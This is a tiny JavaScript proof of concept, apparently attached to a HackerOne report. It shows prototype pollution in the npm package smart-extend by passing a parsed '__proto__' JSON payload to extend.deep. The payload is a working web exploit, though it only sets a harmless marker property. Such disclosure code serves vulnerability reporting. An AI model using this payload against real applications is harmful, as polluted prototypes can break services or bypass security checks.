//https://hackerone.com/reports/438274

 
  var extend = require("smart-extend");
  obj = {};

   
  var payload = '{"__proto__":{"polluted":"yes"}}';

  extend.deep({}, JSON.parse(payload));
// End of file
